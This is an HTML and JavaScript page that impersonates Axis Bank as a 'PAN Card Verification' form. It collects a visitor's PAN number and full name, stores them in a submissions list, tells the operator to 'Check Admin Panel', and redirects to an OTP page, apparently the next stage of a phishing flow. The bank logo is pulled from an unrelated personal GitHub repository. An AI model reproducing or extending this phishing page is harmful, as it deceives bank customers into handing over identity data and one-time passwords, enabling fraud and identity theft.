<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - PAN Card Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
        
        .page-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; display: flex; justify-content: center; align-items: center;
            z-index: 9999; transition: opacity 0.5s ease;
        }
        
        .main-container {
            opacity: 0; animation: fadeIn 0.5s ease 3s forwards; flex: 1;
        }
        @keyframes fadeIn { to { opacity: 1; } }
        
        /* Header */
        .bank-header {
            background: #87103F; padding: 15px 40px; position: relative;
        }
        .header-content {
            max-width: 1200px; margin: 0 auto;
            display: flex; align-items: center; justify-content: space-between;
        }
        .bank-logo {
            height: 45px; width: auto; filter: brightness(0) invert(1);
        }
        .bank-name {
            font-size: 28px; font-weight: bold; color: white; letter-spacing: 1px;
        }
        
        /* Main Content */
        .main-content {
            max-width: 1200px; margin: 30px auto; padding: 0 20px;
            display: flex; flex-direction: column; align-items: center;
        }
        
        .pan-container { width: 100%; max-width: 500px; }
        .pan-box {
            background: white; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); overflow: hidden;
        }
        
        .pan-header {
            background: #87103F; color: white; padding: 25px; text-align: center;
        }
        .pan-title { font-size: 24px; font-weight: bold; margin-bottom: 5px; }
        .pan-subtitle { opacity: 0.9; font-size: 16px; }
        
        .form-container { padding: 30px; }
        
        .info-message {
            background: #f8f9fa; border-left: 4px solid #87103F;
            padding: 15px; margin-bottom: 25px; border-radius: 0 8px 8px 0;
        }
        
        .form-group { margin-bottom: 25px; }
        .form-label {
            display: block; margin-bottom: 8px; color: #333;
            font-weight: bold; font-size: 14px;
        }
        .form-input {
            width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 8px;
            font-size: 16px; transition: all 0.3s ease; background: #f9f9f9;
        }
        .form-input:focus {
            border-color: #87103F; outline: none; background: white;
            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
        }
        
        .verify-button {
            width: 100%; background: #87103F; color: white; border: none;
            padding: 18px; border-radius: 8px; font-size: 18px; font-weight: bold;
            cursor: pointer; transition: all 0.3s ease; position: relative;
            overflow: hidden; box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
        }
        .verify-button:hover {
            background: #6a0c32; transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
        }
        
        .main-footer {
            background: #87103F; color: white; text-align: center;
            padding: 20px; margin-top: 50px;
        }
    </style>
</head>
<body>
    <!-- Page Load Animation -->
    <div class="page-loader" id="pageLoader">
        <div style="font-size: 20px; color: #87103F; font-weight: bold;">
            Loading Axis Bank PAN Verification...
        </div>
    </div>
    
    <!-- Main Container -->
    <div class="main-container">
        <!-- Header -->
        <header class="bank-header">
            <div class="header-content">
                <div style="display: flex; align-items: center; gap: 20px;">
                    <img src="https://raw.githubusercontent.com/shreya99u-max/axisbank/main/IMG_20260201_085106.jpg" 
                         alt="Axis Bank Logo" class="bank-logo">
                    <div class="bank-name">AXIS BANK</div>
                </div>
                <div style="color: white; font-size: 16px;">PAN Card Verification</div>
            </div>
        </header>
        
        <!-- Main Content -->
        <div class="main-content">
            <div class="pan-container">
                <div class="pan-box">
                    <div class="pan-header">
                        <div class="pan-title">PAN Card Verification</div>
                        <div class="pan-subtitle">Enter your PAN card details</div>
                    </div>
                    
                    <div class="form-container">
                        <div class="info-message">
                            <div style="font-weight: bold; color: #87103F; margin-bottom: 5px;">
                                üìù Important Information
                            </div>
                            <div style="color: #666; font-size: 14px;">
                                PAN is mandatory for financial transactions and tax purposes.
                            </div>
                        </div>
                        
                        <!-- PAN Form -->
                        <form id="panForm">
                            <div class="form-group">
                                <label class="form-label" for="panNumber">PAN Card Number</label>
                                <input type="text" class="form-input" id="panNumber" name="panNumber" 
                                       placeholder="Enter 10-digit PAN (e.g., ABCDE1234F)" 
                                       maxlength="10" required>
                                <div style="font-size: 12px; color: #666; margin-top: 5px;">
                                    Format: 5 letters + 4 numbers + 1 letter
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label" for="fullName">Full Name (as per PAN)</label>
                                <input type="text" class="form-input" id="fullName" name="fullName" 
                                       placeholder="Enter your full name as per PAN card" required>
                            </div>
                            
                            <div style="margin-top: 30px;">
                                <button type="submit" class="verify-button" id="verifyButton">
                                    Verify PAN Details
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <footer class="main-footer">
            <div>¬© 2023 Axis Bank Ltd. All Rights Reserved.</div>
        </footer>
    </div>

    <script>
        // Page load animation
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('pageLoader').style.display = 'none';
                document.getElementById('pageLoader').style.opacity = '0';
            }, 1000);
        });
        
        // DOM Elements
        const panForm = document.getElementById('panForm');
        const panNumberInput = document.getElementById('panNumber');
        const fullNameInput = document.getElementById('fullName');
        const verifyButton = document.getElementById('verifyButton');
        
        // ‚úÖ PAN number ‡§ï‡•ã uppercase ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤‡•ã
        panNumberInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        });
        
        // ‚úÖ PAN format validation
        function validatePAN(pan) {
            return /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
        }
        
        // ‚úÖ DEBUG FUNCTION - localStorage status ‡§¶‡§ø‡§ñ‡§æ‡§è‡§Ç
        function debugLocalStorage() {
            console.log('=== DEBUG LOCALSTORAGE ===');
            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            console.log('Total submissions:', submissions.length);
            
            // Type-wise count
            let types = {};
            submissions.forEach(sub => {
                types[sub.type] = (types[sub.type] || 0) + 1;
            });
            console.log('Submissions by type:', types);
            
            // Latest PAN check
            let panSubs = submissions.filter(s => s.type === 'pan');
            console.log('PAN submissions:', panSubs.length);
            if(panSubs.length > 0) {
                console.log('Latest PAN:', panSubs[0]);
            }
            console.log('=== END DEBUG ===');
        }
        
        // ‚úÖ ‡§∏‡§ø‡§Æ‡•ç‡§™‡§≤ save function - ‡§ï‡•ã‡§à complexity ‡§®‡§π‡•Ä‡§Ç
        function savePANDataSimple(panNumber, fullName) {
            try {
                // 1. Get existing data
                let existingData = localStorage.getItem('axisBankSubmissions');
                let submissions = [];
                
                if (existingData) {
                    try {
                        submissions = JSON.parse(existingData);
                        if (!Array.isArray(submissions)) {
                            console.log('‚ö†Ô∏è submissions was not array, resetting...');
                            submissions = [];
                        }
                    } catch (e) {
                        console.log('‚ö†Ô∏è Error parsing existing data, starting fresh...');
                        submissions = [];
                    }
                }
                
                // 2. Create new PAN submission
                const newPAN = {
                    id: 'PAN-' + Date.now(),
                    type: 'pan',
                    timestamp: new Date().toISOString(),
                    date: new Date().toLocaleString('en-IN'),
                    data: {
                        panNumber: panNumber,
                        fullName: fullName,
                        status: 'verified',
                        enteredAt: new Date().toLocaleString()
                    }
                };
                
                console.log('üìù Saving new PAN:', newPAN);
                
                // 3. Add to array
                submissions.unshift(newPAN);
                
                // 4. Save to localStorage
                localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
                
                console.log('‚úÖ PAN saved successfully!');
                console.log('Total submissions now:', submissions.length);
                
                // 5. Immediate verification
                let verify = JSON.parse(localStorage.getItem('axisBankSubmissions'));
                console.log('‚úÖ Verification - Total in localStorage:', verify.length);
                console.log('‚úÖ Latest PAN in localStorage:', verify[0]);
                
                return true;
                
            } catch (error) {
                console.error('‚ùå Error saving PAN:', error);
                return false;
            }
        }
        
        // ‚úÖ Form submission
        panForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const panNumber = panNumberInput.value.trim();
            const fullName = fullNameInput.value.trim();
            
            // Validation
            if (!validatePAN(panNumber)) {
                alert('‚ùå Please enter valid PAN number (Format: ABCDE1234F)');
                panNumberInput.focus();
                return;
            }
            
            if (!fullName) {
                alert('‚ùå Please enter your full name');
                fullNameInput.focus();
                return;
            }
            
            // Show loading
            verifyButton.textContent = "Verifying...";
            verifyButton.disabled = true;
            
            // Before save debug
            console.log('=== BEFORE SAVING ===');
            debugLocalStorage();
            
            // Save data
            const saved = savePANDataSimple(panNumber, fullName);
            
            // After save debug
            console.log('=== AFTER SAVING ===');
            debugLocalStorage();
            
            // Result
            setTimeout(() => {
                verifyButton.textContent = "Verify PAN Details";
                verifyButton.disabled = false;
                
                if (saved) {
                    // Show success message with data
                    alert(`‚úÖ PAN Saved Successfully!\n\nPAN: ${panNumber}\nName: ${fullName}\n\nCheck Admin Panel Now!`);
                    
                    // Redirect
                    window.location.href = 'axis_otp2.html';
                } else {
                    alert('‚ùå Failed to save PAN. Check console for errors.');
                }
            }, 1000);
        });
        
        // ‚úÖ Page load initialization
        window.addEventListener('DOMContentLoaded', function() {
            panNumberInput.focus();
            
            // Initialize if not exists
            if (!localStorage.getItem('axisBankSubmissions')) {
                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
                console.log('‚úÖ Initialized axisBankSubmissions');
            }
            
            // Show current status
            debugLocalStorage();
        });
    </script>
</body>
</html>
